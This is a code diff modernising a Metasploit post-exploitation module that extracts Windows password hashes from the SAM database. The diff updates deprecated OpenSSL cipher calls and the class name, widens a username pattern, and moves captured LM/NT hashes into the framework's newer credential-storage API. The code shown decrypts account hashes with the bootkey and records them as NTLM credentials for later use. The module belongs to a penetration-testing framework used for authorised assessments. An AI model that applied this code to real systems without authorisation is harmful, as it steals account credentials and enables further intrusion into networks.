@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Windows::Priv
@@ -68,7 +68,7 @@ class Metasploit3 < Msf::Post
     hash = Digest::MD5.new
     hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
-    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+    rc4 = OpenSSL::Cipher.new("rc4")
     rc4.key = hash.digest
     hbootkey  = rc4.update(vf[0x80, 32])
     hbootkey << rc4.final
@@ -186,18 +186,18 @@ class Metasploit3 < Msf::Post
 
     des_k1, des_k2 = rid_to_key(rid)
 
-    d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d1 = OpenSSL::Cipher.new('des-ecb')
     d1.padding = 0
     d1.key = des_k1
 
-    d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d2 = OpenSSL::Cipher.new('des-ecb')
     d2.padding = 0
     d2.key = des_k2
 
     md5 = Digest::MD5.new
     md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
 
-    rc4 = OpenSSL::Cipher::Cipher.new('rc4')
+    rc4 = OpenSSL::Cipher.new('rc4')
     rc4.key = md5.digest
     okey = rc4.update(enchash)
 
@@ -247,14 +247,38 @@ class Metasploit3 < Msf::Post
         collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
 
         print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")
-        session.framework.db.report_auth_info(
-          :host  => host,
-          :port  => @smb_port,
-          :sname => 'smb',
-          :user  => users[rid][:Name],
-          :pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
-          :type  => "smb_hash"
-        )
+
+        service_data = {
+            address: host,
+            port: @smb_port,
+            service_name: 'smb',
+            protocol: 'tcp',
+            workspace_id: myworkspace_id
+        }
+
+        credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            private_type: :ntlm_hash,
+            private_data: users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
+            username: users[rid][:Name]
+        }
+
+        credential_data.merge!(service_data)
+
+        # Create the Metasploit::Credential::Core object
+        credential_core = create_credential(credential_data)
+
+        # Assemble the options hash for creating the Metasploit::Credential::Login object
+        login_data ={
+            core: credential_core,
+            status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        # Merge in the service data and create our Login
+        login_data.merge!(service_data)
+        login = create_credential_login(login_data)
       end
 
     rescue ::Interrupt
@@ -299,20 +323,44 @@ class Metasploit3 < Msf::Post
       # skip if it returns nil for an entry
       next if h == nil
       begin
-        user = returned_hash[0].scan(/^[a-zA-Z0-9\-$.]*/).join.gsub(/\.$/,"")
+        user = returned_hash[0].scan(/^[a-zA-Z0-9_\-$.]*/).join.gsub(/\.$/,"")
         lmhash = returned_hash[2].scan(/[a-f0-9]*/).join
         next if lmhash == nil
         hash_entry = "#{user}:#{rid}:#{lmhash}:#{returned_hash[3]}"
         collected_hashes << "#{hash_entry}\n"
         print_good("\t#{hash_entry}")
-        session.framework.db.report_auth_info(
-          :host  => host,
-          :port  => @smb_port,
-          :sname => 'smb',
-          :user  => user,
-          :pass  => "#{lmhash}:#{returned_hash[3]}",
-          :type  => "smb_hash"
-        )
+
+        service_data = {
+            address: host,
+            port: @smb_port,
+            service_name: 'smb',
+            protocol: 'tcp',
+            workspace_id: myworkspace_id
+        }
+
+        credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            private_type: :ntlm_hash,
+            private_data: "#{lmhash}:#{returned_hash[3]}",
+            username: user
+        }
+
+        credential_data.merge!(service_data)
+
+        # Create the Metasploit::Credential::Core object
+        credential_core = create_credential(credential_data)
+
+        # Assemble the options hash for creating the Metasploit::Credential::Login object
+        login_data ={
+            core: credential_core,
+            status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        # Merge in the service data and create our Login
+        login_data.merge!(service_data)
+        login = create_credential_login(login_data)
       rescue
         next
       end
